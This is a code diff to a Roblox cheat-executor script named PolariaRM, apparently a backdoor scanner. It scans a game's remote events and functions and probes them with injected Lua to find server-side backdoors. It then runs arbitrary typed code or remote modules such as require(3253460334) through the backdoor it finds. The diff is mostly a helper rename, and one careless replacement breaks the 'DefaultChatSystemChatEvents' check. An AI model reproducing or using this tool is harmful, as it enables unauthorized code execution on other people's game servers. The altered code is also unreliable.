@@ -2,16 +2,28 @@ if not game:IsLoaded() then
     game.Loaded:Wait()
 end
 
-local Shared = (pcall(getgenv) and getgenv()) or warn("[Shared]: getgenv() isn't supported by this executor.")
+local Shared = (function() local Success, Env = pcall(getgenv); return (Success and Env) or _G or (warn("[Shared]: Failed to access a usable global environment.") or {}) end)()
 
-local function default(expected, value, fallback)
+local function expect(expected, value, fallback)
     if type(value) == expected then
         return value
     end
+
+    if fallback ~= nil then
+        if type(fallback) == "function" then
+            return function(...)
+                warn("[Expect]: Missing executor functionality. Using fallback function.")
+                return fallback(...)
+            end
+        end
+
+        warn("[Expect]: Value has unexpected type. Using fallback value.")
+    end
+
     return fallback
 end
 
-local cloneref = default("function", cloneref, function() return end)
+local cloneref = expect("function", cloneref, function() return end)
 
 local Services = setmetatable({}, {
     __index = function(self, name)
@@ -27,11 +39,11 @@ local Services = setmetatable({}, {
     end
 })
 
-local WriteFile = default("function", writefile, function() return end)
-local IsFile = default("function", isfile, function() return end)
-local IsFolder = default("function", isfolder, function() return end)
-local MakeFolder = default("function", makefolder, function() return end)
-local LoadAsset = default("function", getcustomasset, default("function", getsynasset, nil))
+local WriteFile = expect("function", writefile, function() return end)
+local IsFile = expect("function", isfile, function() return end)
+local IsFolder = expect("function", isfolder, function() return end)
+local MakeFolder = expect("function", makefolder, function() return end)
+local LoadAsset = expect("function", getcustomasset, expect("function", getsynasset, nil))
 
 local Assets = {
     ["PolariaRM/Assets/polaria_logo.png"] = "https://raw.githubusercontent.com/JustSomeGuest/Scripts/main/Universal/PolariaRM/Assets/logo.png",
@@ -40,9 +52,9 @@ local Assets = {
 }
 
 local function HttpGet(url)
-    local RequestFunc = default("function", syn and syn.request, 
-        default("function", request, 
-            default("function", http_request, nil)))
+    local RequestFunc = expect("function", syn and syn.request, 
+        expect("function", request, 
+            expect("function", http_request, nil)))
     
     if not RequestFunc then
         return nil
@@ -1334,7 +1346,7 @@ Container.Visible = false
 Show.Visible = true
 
 coroutine.wrap(function()
-    local GetThumbnail = default("function", Players.GetUserThumbnailAsync, nil)
+    local GetThumbnail = expect("function", Players.GetUserThumbnailAsync, nil)
     if GetThumbnail then
         local success, headshot = pcall(function()
             return GetThumbnail(Players, Player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
@@ -1352,7 +1364,7 @@ end)
 serverStartTime = workspace:GetServerTimeNow()
 
 local function getOS()
-    local GetPlatform = default("function", UserInputService.GetPlatform, nil)
+    local GetPlatform = expect("function", UserInputService.GetPlatform, nil)
     if GetPlatform then
         local p = GetPlatform(UserInputService)
         if p == Enum.Platform.Windows then return "Windows" end
@@ -1371,7 +1383,7 @@ local function updateStats()
     if net then
         local item = net:FindFirstChild("ServerStatsItem")
         if item and item:FindFirstChild("Data Ping") then
-            local GetValue = default("function", item["Data Ping"].GetValue, nil)
+            local GetValue = expect("function", item["Data Ping"].GetValue, nil)
             if GetValue then
                 ping = math.floor(GetValue(item["Data Ping"]))
             end
@@ -1386,15 +1398,15 @@ local function updateStats()
     local executor = "Unknown"
     
     local executorChecks = {
-        {cond = default("boolean", syn and syn.request, false), name = "Synapse X"},
-        {cond = default("boolean", KRNL_isLoaded, false), name = "KRNL"},
-        {cond = default("boolean", fluxus, false), name = "Fluxus"},
-        {cond = default("boolean", is_sirhurt_closure, false), name = "SirHurt"},
-        {cond = default("boolean", PROTOSMASHER_isLoaded, false), name = "ProtoSmasher"},
-        {cond = default("boolean", ELECTRON_isLoaded, false), name = "Electron"},
-        {cond = default("boolean", is_synapse_function, false), name = "Synapse X"},
-        {cond = default("function", identifyexecutor, nil), name = identifyexecutor and identifyexecutor() or nil},
-        {cond = default("function", getexecutorname, nil), name = getexecutorname and getexecutorname() or nil}
+        {cond = expect("boolean", syn and syn.request, false), name = "Synapse X"},
+        {cond = expect("boolean", KRNL_isLoaded, false), name = "KRNL"},
+        {cond = expect("boolean", fluxus, false), name = "Fluxus"},
+        {cond = expect("boolean", is_sirhurt_closure, false), name = "SirHurt"},
+        {cond = expect("boolean", PROTOSMASHER_isLoaded, false), name = "ProtoSmasher"},
+        {cond = expect("boolean", ELECTRON_isLoaded, false), name = "Electron"},
+        {cond = expect("boolean", is_synapse_function, false), name = "Synapse X"},
+        {cond = expect("function", identifyexecutor, nil), name = identifyexecutor and identifyexecutor() or nil},
+        {cond = expect("function", getexecutorname, nil), name = getexecutorname and getexecutorname() or nil}
     }
     
     for _, check in ipairs(executorChecks) do
@@ -1436,16 +1448,16 @@ end
 
 local function runRemote(remote, data)
     if remote then
-        local isRemoteEvent = default("boolean", remote:IsA("RemoteEvent"), false)
-        local isRemoteFunction = default("boolean", remote:IsA("RemoteFunction"), false)
+        local isRemoteEvent = expect("boolean", remote:IsA("RemoteEvent"), false)
+        local isRemoteFunction = expect("boolean", remote:IsA("RemoteFunction"), false)
         
         if isRemoteEvent then
-            local FireServer = default("function", remote.FireServer, nil)
+            local FireServer = expect("function", remote.FireServer, nil)
             if FireServer then
                 FireServer(remote, data)
             end
         elseif isRemoteFunction then
-            local InvokeServer = default("function", remote.InvokeServer, nil)
+            local InvokeServer = expect("function", remote.InvokeServer, nil)
             if InvokeServer then
                 spawn(function() 
                     InvokeServer(remote, data)
@@ -1462,7 +1474,7 @@ local function findRemote()
     local remotes = {}
     local code
     
-    local GetProductInfo = default("function", MarketplaceService and MarketplaceService.GetProductInfo, nil)
+    local GetProductInfo = expect("function", MarketplaceService and MarketplaceService.GetProductInfo, nil)
     local gameName = "Unknown Game"
     if GetProductInfo then
         local success, info = pcall(function()
@@ -1489,7 +1501,7 @@ local function findRemote()
                 end
             end
             spawn(function() 
-                local InvokeServer = default("function", protected_backdoor.InvokeServer, nil)
+                local InvokeServer = expect("function", protected_backdoor.InvokeServer, nil)
                 if InvokeServer then
                     InvokeServer(protected_backdoor, '.', "a=Instance.new('Model',workspace)a.Name='"..code.."'")
                 end
@@ -1499,8 +1511,8 @@ local function findRemote()
     end
     
     for i, remote in game:GetDescendants() do
-        local isRemoteEvent = default("boolean", remote:IsA("RemoteEvent"), false)
-        local isRemoteFunction = default("boolean", remote:IsA("RemoteFunction"), false)
+        local isRemoteEvent = expect("boolean", remote:IsA("RemoteEvent"), false)
+        local isRemoteFunction = expect("boolean", remote:IsA("RemoteFunction"), false)
         
         if not isRemoteEvent and not isRemoteFunction then 
             continue 
@@ -1522,7 +1534,7 @@ local function findRemote()
                 continue
             end
             
-            if remote.Parent and remote.Parent.Name == 'DefaultChatSystemChatEvents' then
+            if remote.Parent and remote.Parent.Name == 'expectChatSystemChatEvents' then
                 continue
             end
         end
@@ -1574,7 +1586,7 @@ local function CreateButton(name, code)
         if backdoorRemote then
             runRemote(backdoorRemote, code)
         else
-            local SetCore = default("function", Services.StarterGui.SetCore, nil)
+            local SetCore = expect("function", Services.StarterGui.SetCore, nil)
             if SetCore then
                 SetCore(Services.StarterGui, "SendNotification", {
                     Title = "PolariaRM (Error)",
@@ -1652,7 +1664,7 @@ CreateButton("Pity Hub", "require(3253460334)('" .. Player.Name .. "')")
 BtnExample:Destroy()
 
 Exe.MouseButton1Click:Connect(function()
-    local SetCore = default("function", Services.StarterGui.SetCore, nil)
+    local SetCore = expect("function", Services.StarterGui.SetCore, nil)
     if backdoorRemote and InputBox.Text ~= "" then
         runRemote(backdoorRemote, InputBox.Text)
     elseif not backdoorRemote and SetCore then
@@ -1670,7 +1682,7 @@ Clr.MouseButton1Click:Connect(function()
 end)
 
 Re.MouseButton1Click:Connect(function()
-    local SetCore = default("function", Services.StarterGui.SetCore, nil)
+    local SetCore = expect("function", Services.StarterGui.SetCore, nil)
     local success, errorMsg = pcall(function()
         if backdoorRemote then
             local TARGET_USERNAME = Player.Name
